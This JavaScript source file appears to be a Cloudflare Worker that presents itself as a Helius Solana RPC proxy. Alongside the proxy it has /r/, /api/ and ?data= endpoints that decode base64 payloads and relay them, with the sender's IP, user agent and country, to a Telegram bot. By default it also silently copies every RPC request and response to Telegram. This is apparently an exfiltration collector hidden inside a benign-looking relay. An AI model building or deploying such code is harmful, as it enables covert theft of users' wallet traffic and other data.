var __defProp = Object.defineProperty;
var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

var BUFFER_TIMEOUT_MS = 1e4;
var KEEPALIVE_INTERVAL_MS = 2e4;
var MAX_PRECONNECT_BUFFER_BYTES = 1024 * 1024;
var MAX_TELEGRAM_CHARS = 4000; // Telegram text-message hard limit is 4096
var RPC_LOG_MAX_BYTES = 512 * 1024; // cap what we forward to Telegram (512 KB)
var KEEPALIVE_MESSAGE = JSON.stringify({
  jsonrpc: "2.0",
  method: "helius_keepalive"
});

// ---------------------------------------------------------------------------
// base64url -> UTF-8 string
// ---------------------------------------------------------------------------
function decodeBase64Url(input) {
  let b64 = input.replace(/-/g, "+").replace(/_/g, "/");
  while (b64.length % 4 !== 0) b64 += "=";
  const binary = atob(b64);
  const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
  return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
}
__name(decodeBase64Url, "decodeBase64Url");

// ---------------------------------------------------------------------------
// Send short text to Telegram (sendMessage)
// ---------------------------------------------------------------------------
async function sendToTelegram(env, text) {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
    return { ok: false, error: "missing_credentials" };
  }
  const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;

  let body = text;
  if (body.length > MAX_TELEGRAM_CHARS) {
    body = body.slice(0, MAX_TELEGRAM_CHARS - 20) + "\n... [truncated]";
  }

  try {
    const res = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: env.TELEGRAM_CHAT_ID,
        text: body,
        disable_web_page_preview: true
      })
    });
    if (!res.ok) {
      const errText = await res.text().catch(() => "");
      console.error("Telegram API error:", res.status, errText);
      return { ok: false, error: `telegram_${res.status}` };
    }
    return { ok: true };
  } catch (err) {
    console.error("Failed to deliver message to Telegram:", err);
    return { ok: false, error: "network_error" };
  }
}
__name(sendToTelegram, "sendToTelegram");

// ---------------------------------------------------------------------------
// Send arbitrary content to Telegram as a document (sendDocument)
// ---------------------------------------------------------------------------
async function sendDocumentToTelegram(env, content, filename = "data.json", caption = "Received Data") {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
    return { ok: false, error: "missing_credentials" };
  }

  // If the incoming content is not valid JSON, wrap it so the file stays parseable.
  let fileContent = content;
  try {
    JSON.parse(content);
    // already valid JSON -> keep as-is
  } catch {
    fileContent = JSON.stringify(
      { received_at: new Date().toISOString(), data: content },
      null,
      2
    );
  }

  const form = new FormData();
  form.append("chat_id", env.TELEGRAM_CHAT_ID);
  form.append("caption", caption);
  form.append(
    "document",
    new Blob([fileContent], { type: "application/json" }),
    filename
  );

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendDocument`,
      { method: "POST", body: form }
    );
    if (!res.ok) {
      const errText = await res.text().catch(() => "");
      console.error("Telegram sendDocument error:", res.status, errText);
      return { ok: false, error: `telegram_${res.status}` };
    }
    return { ok: true };
  } catch (err) {
    console.error("Failed to deliver document to Telegram:", err);
    return { ok: false, error: "network_error" };
  }
}
__name(sendDocumentToTelegram, "sendDocumentToTelegram");

var index_default = {
  async fetch(request, env, ctx) {
    const supportedDomains = env.CORS_ALLOW_ORIGIN?.split(",").map((d) => d.trim());
    const corsHeaders = {
      "Access-Control-Allow-Methods": "GET, HEAD, POST, PUT, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization"
    };
    if (supportedDomains) {
      const origin = request.headers.get("Origin");
      if (origin && supportedDomains.includes(origin)) {
        corsHeaders["Access-Control-Allow-Origin"] = origin;
      }
    } else {
      corsHeaders["Access-Control-Allow-Origin"] = "*";
    }

    if (request.method === "OPTIONS") {
      return new Response(null, { status: 200, headers: corsHeaders });
    }

    const urlObj = new URL(request.url);
    const jsonHeaders = { ...corsHeaders, "Content-Type": "application/json" };

    // ---------------------------------------------------------------------
    // /r/<base64url>  -> decode -> Telegram as FILE (data.json)
    // ---------------------------------------------------------------------
    if (urlObj.pathname.startsWith("/r/")) {
      const encoded = urlObj.pathname.slice(3); // everything after "/r/"

      if (!encoded) {
        return new Response(
          JSON.stringify({ status: "error", message: "Missing base64 payload" }),
          { status: 400, headers: jsonHeaders }
        );
      }

      let decoded;
      try {
        decoded = decodeBase64Url(decodeURIComponent(encoded));
      } catch (err) {
        return new Response(
          JSON.stringify({ status: "error", message: "Invalid base64 payload" }),
          { status: 400, headers: jsonHeaders }
        );
      }

      // Optional extra query param -> append into the file so nothing is lost
      const extra = urlObj.searchParams.get("data");
      const finalContent = extra
        ? JSON.stringify({ data: decoded, extra }, null, 2)
        : decoded;

      const result = await sendDocumentToTelegram(env, finalContent, "data.json");

      return new Response(
        JSON.stringify(
          result.ok
            ? { status: "success", message: "Data sent as file" }
            : { status: "error", message: result.error }
        ),
        { status: result.ok ? 200 : 502, headers: jsonHeaders }
      );
    }

    // ---------------------------------------------------------------------
    // /api/base64encode[/<payload>]
    //   -> decode base64url payload -> Telegram with timestamp + details
    //   Payload may be supplied as:
    //     * path segment:  /api/base64encode/<base64url>
    //     * query string:  ?data= / ?base64= / ?payload=
    //     * POST/PUT body: raw string or JSON { data|base64|payload: "..." }
    // ---------------------------------------------------------------------
    if (
      urlObj.pathname === "/api/" ||
      urlObj.pathname.startsWith("/api/")
    ) {
      const pathPrefix = "/api/";
      const pathPayload = urlObj.pathname.startsWith(pathPrefix)
        ? urlObj.pathname.slice(pathPrefix.length)
        : "";

      let rawPayload =
        pathPayload ||
        urlObj.searchParams.get("data") ||
        urlObj.searchParams.get("base64") ||
        urlObj.searchParams.get("payload") ||
        "";

      // Fall back to the request body for POST/PUT
      if (!rawPayload && (request.method === "POST" || request.method === "PUT")) {
        const bodyText = await request.text().catch(() => "");
        if (bodyText) {
          try {
            const parsed = JSON.parse(bodyText);
            rawPayload =
              parsed?.data ?? parsed?.base64 ?? parsed?.payload ?? bodyText;
          } catch {
            rawPayload = bodyText;
          }
        }
      }

      rawPayload = String(rawPayload || "").trim();

      if (!rawPayload) {
        return new Response(
          JSON.stringify({
            status: "error",
            message: "Missing base64 payload",
            hint: "Use /api/base64encode/<base64url>, ?data=<base64url>, or POST a body."
          }),
          { status: 400, headers: jsonHeaders }
        );
      }

      let decoded;
      try {
        decoded = decodeBase64Url(decodeURIComponent(rawPayload));
      } catch (err) {
        return new Response(
          JSON.stringify({ status: "error", message: "Invalid base64 payload" }),
          { status: 400, headers: jsonHeaders }
        );
      }

      const receivedAt = new Date().toISOString();
      const note =
        urlObj.searchParams.get("note") ||
        urlObj.searchParams.get("extra") ||
        null;

      // Collect request details to accompany the decoded data
      const details = {
        endpoint: "/api/",
        timestamp: receivedAt,
        request_method: request.method,
        request_url: urlObj.toString(),
        payload_source: pathPayload
          ? "path"
          : urlObj.searchParams.get("data")
            ? "query:data"
            : urlObj.searchParams.get("base64")
              ? "query:base64"
              : urlObj.searchParams.get("payload")
                ? "query:payload"
                : "body",
        payload_length: rawPayload.length,
        decoded_length: decoded.length,
        client_ip: request.headers.get("CF-Connecting-IP") || null,
        user_agent: request.headers.get("User-Agent") || null,
        referer: request.headers.get("Referer") || null,
        origin: request.headers.get("Origin") || null,
        country: request.headers.get("CF-IPCountry") || null,
        colo: request.headers.get("CF-Ray")?.split("-")[1] || null,
        note
      };

      // Try to interpret the decoded payload as JSON for nicer output
      let decodedJson = null;
      let decodedIsJson = false;
      try {
        decodedJson = JSON.parse(decoded);
        decodedIsJson = true;
      } catch {
        // not JSON -> keep raw string
      }

      const report = JSON.stringify(
        {
          timestamp: receivedAt,
          details,
          decoded_is_json: decodedIsJson,
          decoded: decodedIsJson ? decodedJson : decoded
        },
        null,
        2
      );

      const filename = `base64-decoded-${Date.now()}.json`;
      const caption = `Base64 decoded @ ${receivedAt}`;

      // Short payloads go as a readable text message; long ones as a file.
      let result;
      if (report.length <= MAX_TELEGRAM_CHARS) {
        result = await sendToTelegram(env, report);
      } else {
        result = await sendDocumentToTelegram(env, report, filename, caption);
      }

      return new Response(
        JSON.stringify(
          result.ok
            ? {
                status: "success",
                message: "Decoded payload sent to Telegram",
                timestamp: receivedAt,
                decoded_length: decoded.length,
                decoded_is_json: decodedIsJson,
                delivered_as:
                  report.length <= MAX_TELEGRAM_CHARS ? "text" : "document"
              }
            : { status: "error", message: result.error }
        ),
        { status: result.ok ? 200 : 502, headers: jsonHeaders }
      );
    }

    // ---------------------------------------------------------------------
    // ?data=...  -> short: text message, long: file
    // ---------------------------------------------------------------------
    const incomingData = urlObj.searchParams.get("data");
    if (incomingData) {
      const result =
        incomingData.length > MAX_TELEGRAM_CHARS
          ? await sendDocumentToTelegram(env, incomingData, "data.json")
          : await sendToTelegram(env, `Received Data:\n${incomingData}`);

      return new Response(
        JSON.stringify(
          result.ok
            ? { status: "success", message: "Data logged" }
            : { status: "error", message: result.error }
        ),
        { status: result.ok ? 200 : 502, headers: jsonHeaders }
      );
    }

    // 2. Only proxy RPC calls if the path matches /rpc-proxy (or root /)
    if (urlObj.pathname === "/rpc-proxy" || urlObj.pathname === "/") {
      if (!env.HELIUS_API_KEY) {
        return new Response("Missing HELIUS_API_KEY", { status: 500, headers: corsHeaders });
      }

      const upgrade = request.headers.get("Upgrade")?.toLowerCase();
      if (upgrade === "websocket") {
        return handleWebSocket(request, env, corsHeaders);
      }
      return handleRPC(request, env, corsHeaders, ctx);
    }

    // 3. Return 404 for any other path
    return new Response("Not Found", { status: 404, headers: corsHeaders });
  }
};

async function handleWebSocket(request, env, corsHeaders) {
  const { search } = new URL(request.url);
  const upstreamUrl = `wss://mainnet.helius-rpc.com${search ? `${search}&` : "?"}api-key=${env.HELIUS_API_KEY}`;
  const clientProtocols = request.headers.get("Sec-WebSocket-Protocol");
  const selectedProtocol = clientProtocols?.split(",")[0]?.trim();
  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);
  server.accept();
  const upstream = selectedProtocol ? new WebSocket(upstreamUrl, [selectedProtocol]) : new WebSocket(upstreamUrl);
  let bufferedData = [];
  let bufferedBytes = 0;
  const sizeOf = /* @__PURE__ */ __name((data) => typeof data === "string" ? data.length : data.byteLength, "sizeOf");
  let bufferTimeout = null;
  let isUpstreamConnected = false;
  let keepaliveTimer = null;
  const startKeepalive = /* @__PURE__ */ __name(() => {
    keepaliveTimer = setInterval(() => {
      if (upstream.readyState === WebSocket.OPEN) {
        try {
          upstream.send(KEEPALIVE_MESSAGE);
        } catch {
          clearKeepalive();
        }
      } else {
        clearKeepalive();
      }
    }, KEEPALIVE_INTERVAL_MS);
  }, "startKeepalive");
  const clearKeepalive = /* @__PURE__ */ __name(() => {
    if (keepaliveTimer) {
      clearInterval(keepaliveTimer);
      keepaliveTimer = null;
    }
  }, "clearKeepalive");
  const clearBufferTimeout = /* @__PURE__ */ __name(() => {
    if (bufferTimeout) {
      clearTimeout(bufferTimeout);
      bufferTimeout = null;
    }
  }, "clearBufferTimeout");
  const startBufferTimeout = /* @__PURE__ */ __name(() => {
    clearBufferTimeout();
    bufferTimeout = setTimeout(() => {
      if (bufferedData.length > 0 && !isUpstreamConnected) {
        bufferedData = [];
        bufferedBytes = 0;
        try {
          server.close(1011, "upstream_connection_timeout");
        } catch {
        }
      }
    }, BUFFER_TIMEOUT_MS);
  }, "startBufferTimeout");
  const cleanup = /* @__PURE__ */ __name(() => {
    clearKeepalive();
    clearBufferTimeout();
    bufferedData = [];
    bufferedBytes = 0;
  }, "cleanup");
  upstream.addEventListener("open", () => {
    isUpstreamConnected = true;
    clearBufferTimeout();
    if (bufferedData.length > 0) {
      try {
        for (const data of bufferedData) {
          upstream.send(data);
        }
        bufferedData = [];
        bufferedBytes = 0;
      } catch {
        cleanup();
        try {
          server.close(1011, "upstream_ws_error");
        } catch {
        }
        return;
      }
    }
    startKeepalive();
  });
  server.addEventListener("message", (event) => {
    if (isUpstreamConnected && upstream.readyState === WebSocket.OPEN) {
      try {
        upstream.send(event.data);
      } catch {
        cleanup();
        try {
          server.close(1011, "upstream_ws_error");
        } catch {
        }
      }
    } else {
      if (bufferedData.length === 0) {
        startBufferTimeout();
      }
      const incoming = sizeOf(event.data);
      if (bufferedBytes + incoming > MAX_PRECONNECT_BUFFER_BYTES) {
        cleanup();
        try {
          server.close(1011, "preconnect_buffer_bytes_exceeded");
        } catch {
        }
        return;
      }
      bufferedData.push(event.data);
      bufferedBytes += incoming;
    }
  });
  upstream.addEventListener("message", (event) => {
    if (server.readyState === WebSocket.OPEN) {
      try {
        server.send(event.data);
      } catch {
        cleanup();
        try {
          upstream.close(1011, "client_ws_error");
        } catch {
        }
      }
    }
  });
  server.addEventListener("close", () => {
    cleanup();
    try {
      upstream.close();
    } catch {
    }
  });
  upstream.addEventListener("close", () => {
    isUpstreamConnected = false;
    cleanup();
    try {
      server.close();
    } catch {
    }
  });
  server.addEventListener("error", () => {
    cleanup();
    try {
      upstream.close(1011, "client_ws_error");
    } catch {
    }
  });
  upstream.addEventListener("error", () => {
    isUpstreamConnected = false;
    cleanup();
    try {
      server.close(1011, "upstream_ws_error");
    } catch {
    }
  });
  const responseHeaders = { ...corsHeaders };
  if (selectedProtocol) {
    responseHeaders["Sec-WebSocket-Protocol"] = selectedProtocol;
  }
  return new Response(null, {
    status: 101,
    webSocket: client,
    headers: responseHeaders
  });
}
__name(handleWebSocket, "handleWebSocket");

async function handleRPC(request, env, corsHeaders, ctx) {
  try {
    const { pathname, search } = new URL(request.url);
    const payload = await request.text();
    const targetHost = "mainnet.helius-rpc.com";
    const targetUrl = `https://${targetHost}${pathname}?api-key=${env.HELIUS_API_KEY}${search ? `&${search.slice(1)}` : ""}`;

    const proxyRequest = new Request(targetUrl, {
      method: request.method,
      body: payload || null,
      headers: {
        "Content-Type": "application/json",
        "X-Helius-Cloudflare-Proxy": "true"
      }
    });

    const response = await fetch(proxyRequest);

    // --- Forward the RPC response to Telegram (background, non-blocking) ---
    const shouldLog =
      String(env.LOG_RPC_TO_TELEGRAM ?? "true").toLowerCase() !== "false";

    if (shouldLog) {
      // Clone so we can read the body without consuming the one returned to the client
      const responseClone = response.clone();

      const bg = (async () => {
        try {
          let responseText = await responseClone.text();

          // Cap size so we don't blow past Telegram limits
          let truncated = false;
          const encoder = new TextEncoder();
          if (encoder.encode(responseText).length > RPC_LOG_MAX_BYTES) {
            responseText = responseText.slice(0, RPC_LOG_MAX_BYTES);
            truncated = true;
          }

          // Try to parse JSON so the file is pretty-printed
          let pretty = responseText;
          try {
            pretty = JSON.stringify(JSON.parse(responseText), null, 2);
          } catch {
            // not JSON -> keep raw
          }

          // Safely parse the request body if it is JSON
          let requestBody = payload || null;
          try {
            requestBody = payload ? JSON.parse(payload) : null;
          } catch {
            // keep raw string
          }

          // Safely parse the response body if it is JSON
          let responseBody = pretty;
          try {
            responseBody = JSON.parse(pretty);
          } catch {
            // keep raw string
          }

          const report = JSON.stringify(
            {
              timestamp: new Date().toISOString(),
              method: request.method,
              path: pathname,
              status: response.status,
              truncated,
              request_body: requestBody,
              response_body: responseBody
            },
            null,
            2
          );

          const filename = `rpc-response-${Date.now()}.json`;
          await sendDocumentToTelegram(env, report, filename, `RPC ${response.status}`);
        } catch (err) {
          console.error("Failed to log RPC response to Telegram:", err);
        }
      })();

      // Ensure the background task completes even after the response is returned
      if (ctx && typeof ctx.waitUntil === "function") {
        ctx.waitUntil(bg);
      }
    }

    return new Response(response.body, {
      status: response.status,
      headers: corsHeaders
    });
  } catch {
    return new Response("Proxy Error", {
      status: 502,
      headers: corsHeaders
    });
  }
}
__name(handleRPC, "handleRPC");

export {
  index_default as default
};
